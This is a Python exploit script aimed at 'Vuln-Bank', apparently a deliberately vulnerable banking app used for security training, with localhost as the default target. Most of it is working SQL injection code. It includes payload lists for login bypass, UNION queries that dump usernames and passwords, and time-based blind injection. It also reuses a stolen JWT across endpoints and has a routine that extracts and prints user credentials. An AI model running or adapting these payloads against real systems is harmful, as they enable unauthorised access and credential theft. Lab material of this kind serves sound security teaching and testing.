#!/usr/bin/env python3
"""
SQL Injection Exploit for Vuln-Bank

This script demonstrates SQL injection vulnerabilities in the Vuln-Bank application
through dynamic testing of various endpoints.

Usage:
    python3 exploit.py [target_url]

Example:
    python3 exploit.py http://localhost:5000
"""

import requests
import json
import sys
import argparse
import time
from urllib.parse import quote

def test_login_sqli(base_url):
    """
    Test SQL injection in the login endpoint
    
    Args:
        base_url: The base URL of the vulnerable application
        
    Returns:
        tuple: (success, token, user_data) if successful, (False, None, None) otherwise
    """
    print(f"[*] Testing SQL injection in login endpoint...")
    
    login_url = f"{base_url}/login"
    headers = {"Content-Type": "application/json"}
    
    # Test payloads
    payloads = [
        "' OR 1=1 --",
        "admin' --",
        "' OR '1'='1",
        "' OR 1=1 LIMIT 1 --",
        "' UNION SELECT 1,2,'admin','password',5,6,7,1,9 --"
    ]
    
    for payload in payloads:
        print(f"[*] Trying payload: {payload}")
        data = {"username": payload, "password": "anything"}
        
        try:
            response = requests.post(login_url, headers=headers, json=data)
            
            if response.status_code == 200:
                resp_data = response.json()
                if resp_data.get('status') == 'success':
                    print(f"[+] SQL injection successful with payload: {payload}")
                    print(f"[+] Logged in as: {resp_data.get('username')}")
                    print(f"[+] Admin Access: {resp_data.get('is_admin')}")
                    print(f"[+] JWT Token: {resp_data.get('token')}")
                    print()
                    return True, resp_data.get('token'), resp_data
            
            print(f"[-] Payload failed: {payload}")
            print(f"[-] Response: {response.text}")
            print()
            
        except Exception as e:
            print(f"[-] Error during login SQL injection test: {str(e)}")
    
    print("[-] All login SQL injection payloads failed.")
    return False, None, None

def test_account_balance_sqli(base_url, token=None):
    """
    Test SQL injection in the account balance endpoint
    
    Args:
        base_url: The base URL of the vulnerable application
        token: JWT token for authentication (optional)
        
    Returns:
        bool: True if successful, False otherwise
    """
    print(f"[*] Testing SQL injection in account balance endpoint...")
    
    headers = {}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    
    # Test payloads
    payloads = [
        "' OR 1=1 --",
        "' UNION SELECT 'admin', 9999999 --",
        "' UNION SELECT username, balance FROM users WHERE username='admin' --",
        "' AND (SELECT 1 FROM users WHERE username='admin' AND LENGTH(password)>5) --",
        "'; SELECT * FROM users --"
    ]
    
    for payload in payloads:
        print(f"[*] Trying payload: {payload}")
        encoded_payload = quote(payload)
        balance_url = f"{base_url}/check_balance/{encoded_payload}"
        
        try:
            response = requests.get(balance_url, headers=headers)
            
            if response.status_code == 200:
                resp_data = response.json()
                if resp_data.get('status') == 'success':
                    print(f"[+] SQL injection successful with payload: {payload}")
                    print(f"[+] Retrieved data: {json.dumps(resp_data, indent=2)}")
                    print()
                    return True
            
            print(f"[-] Payload failed: {payload}")
            print(f"[-] Response: {response.text}")
            print()
            
        except Exception as e:
            print(f"[-] Error during account balance SQL injection test: {str(e)}")
    
    print("[-] All account balance SQL injection payloads failed.")
    return False

def test_transaction_history_sqli(base_url, token=None):
    """
    Test SQL injection in the transaction history endpoint
    
    Args:
        base_url: The base URL of the vulnerable application
        token: JWT token for authentication (optional)
        
    Returns:
        bool: True if successful, False otherwise
    """
    print(f"[*] Testing SQL injection in transaction history endpoint...")
    
    headers = {}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    
    # Test payloads
    payloads = [
        "' OR 1=1 --",
        "' UNION SELECT 1,2,3,4,5,'union_test',7 --",
        "' OR '1'='1",
        "' AND 1=2 UNION SELECT null, null, null, null, null, null, (SELECT GROUP_CONCAT(username||':'||password) FROM users) --",
        "'; SELECT * FROM transactions --"
    ]
    
    for payload in payloads:
        print(f"[*] Trying payload: {payload}")
        encoded_payload = quote(payload)
        transactions_url = f"{base_url}/transactions/{encoded_payload}"
        
        try:
            response = requests.get(transactions_url, headers=headers)
            
            if response.status_code == 200:
                resp_data = response.json()
                if resp_data.get('status') == 'success':
                    print(f"[+] SQL injection successful with payload: {payload}")
                    print(f"[+] Number of transactions: {len(resp_data.get('transactions', []))}")
                    if resp_data.get('transactions'):
                        print(f"[+] Sample transaction: {json.dumps(resp_data['transactions'][0], indent=2)}")
                    print()
                    return True
            
            print(f"[-] Payload failed: {payload}")
            print(f"[-] Response: {response.text}")
            print()
            
        except Exception as e:
            print(f"[-] Error during transaction history SQL injection test: {str(e)}")
    
    print("[-] All transaction history SQL injection payloads failed.")
    return False

def test_user_search_sqli(base_url, token=None):
    """
    Test SQL injection in the user search endpoint
    
    Args:
        base_url: The base URL of the vulnerable application
        token: JWT token for authentication (optional)
        
    Returns:
        bool: True if successful, False otherwise
    """
    print(f"[*] Testing SQL injection in user search endpoint...")
    
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    
    # Test payloads
    payloads = [
        "' OR 1=1 --",
        "a' UNION SELECT id, username, password, email, account_number, balance, 7, 8 FROM users --",
        "a'; SELECT * FROM users --",
        "' OR username LIKE '%admin%",
        "' OR '1'='1"
    ]
    
    for payload in payloads:
        print(f"[*] Trying payload: {payload}")
        search_url = f"{base_url}/api/users/search"
        data = {"search_term": payload}
        
        try:
            response = requests.post(search_url, headers=headers, json=data)
            
            if response.status_code == 200:
                resp_data = response.json()
                if resp_data.get('status') == 'success':
                    print(f"[+] SQL injection successful with payload: {payload}")
                    print(f"[+] Number of users found: {len(resp_data.get('users', []))}")
                    if resp_data.get('users'):
                        print(f"[+] Sample user: {json.dumps(resp_data['users'][0], indent=2)}")
                    print()
                    return True
            
            print(f"[-] Payload failed: {payload}")
            print(f"[-] Response: {response.text}")
            print()
            
        except Exception as e:
            print(f"[-] Error during user search SQL injection test: {str(e)}")
    
    print("[-] All user search SQL injection payloads failed.")
    return False

def test_blind_sqli(base_url, token=None):
    """
    Test blind SQL injection techniques
    
    Args:
        base_url: The base URL of the vulnerable application
        token: JWT token for authentication (optional)
        
    Returns:
        bool: True if successful, False otherwise
    """
    print(f"[*] Testing blind SQL injection techniques...")
    
    headers = {}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    
    # Test time-based blind SQL injection
    print(f"[*] Testing time-based blind SQL injection...")
    
    payloads = [
        "' OR (SELECT CASE WHEN (1=1) THEN pg_sleep(2) ELSE pg_sleep(0) END) --",
        "' OR (SELECT CASE WHEN (username='admin') THEN sleep(2) ELSE sleep(0) END FROM users LIMIT 1) --",
        "' OR (SELECT CASE WHEN (EXISTS(SELECT 1 FROM users WHERE username='admin')) THEN sleep(2) ELSE sleep(0) END) --",
        "'; SELECT sleep(2) --"
    ]
    
    for payload in payloads:
        print(f"[*] Trying payload: {payload}")
        encoded_payload = quote(payload)
        url = f"{base_url}/check_balance/{encoded_payload}"
        
        try:
            start_time = time.time()
            response = requests.get(url, headers=headers)
            end_time = time.time()
            
            execution_time = end_time - start_time
            
            if execution_time >= 2:
                print(f"[+] Time-based blind SQL injection successful with payload: {payload}")
                print(f"[+] Execution time: {execution_time:.2f} seconds")
                print()
                return True
            
            print(f"[-] Payload failed: {payload}")
            print(f"[-] Execution time: {execution_time:.2f} seconds")
            print()
            
        except Exception as e:
            print(f"[-] Error during blind SQL injection test: {str(e)}")
    
    print("[-] All blind SQL injection payloads failed.")
    return False

def extract_data_with_sqli(base_url, token=None):
    """
    Attempt to extract sensitive data using SQL injection
    
    Args:
        base_url: The base URL of the vulnerable application
        token: JWT token for authentication (optional)
        
    Returns:
        dict: Extracted data if successful, empty dict otherwise
    """
    print(f"[*] Attempting to extract sensitive data using SQL injection...")
    
    headers = {}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    
    extracted_data = {}
    
    # Try to extract user table data
    payload = "' UNION SELECT null, username, password, null, null, null, null FROM users --"
    encoded_payload = quote(payload)
    url = f"{base_url}/transactions/{encoded_payload}"
    
    try:
        response = requests.get(url, headers=headers)
        
        if response.status_code == 200:
            resp_data = response.json()
            if 'transactions' in resp_data and resp_data['transactions']:
                users = []
                for transaction in resp_data['transactions']:
                    if transaction.get('description') and ':' in transaction.get('description'):
                        username, password = transaction.get('description').split(':', 1)
                        users.append({"username": username, "password": password})
                
                if users:
                    extracted_data['users'] = users
                    print(f"[+] Successfully extracted user credentials:")
                    for user in users:
                        print(f"    {user['username']}:{user['password']}")
    except Exception as e:
        print(f"[-] Error during data extraction: {str(e)}")
    
    return extracted_data

def main():
    parser = argparse.ArgumentParser(description="Test SQL injection vulnerabilities in Vuln-Bank")
    parser.add_argument("url", nargs="?", default="http://localhost:5000", 
                        help="Base URL of the vulnerable application (default: http://localhost:5000)")
    args = parser.parse_args()
    
    print("=== Vuln-Bank SQL Injection Exploit ===")
    print(f"[*] Target: {args.url}")
    
    # Test SQL injection in login
    success, token, user_data = test_login_sqli(args.url)
    
    if success:
        print("[+] SQL injection in login endpoint is vulnerable!")
        
        # If we have a token, test authenticated endpoints
        if token:
            test_account_balance_sqli(args.url, token)
            test_transaction_history_sqli(args.url, token)
            test_user_search_sqli(args.url, token)
            test_blind_sqli(args.url, token)
            extract_data_with_sqli(args.url, token)
    else:
        # Try unauthenticated endpoints
        print("[*] Testing unauthenticated endpoints...")
        test_account_balance_sqli(args.url)
        test_transaction_history_sqli(args.url)
        test_user_search_sqli(args.url)
        test_blind_sqli(args.url)
    
    print("\n[*] SQL injection testing complete.")

if __name__ == "__main__":
    main()
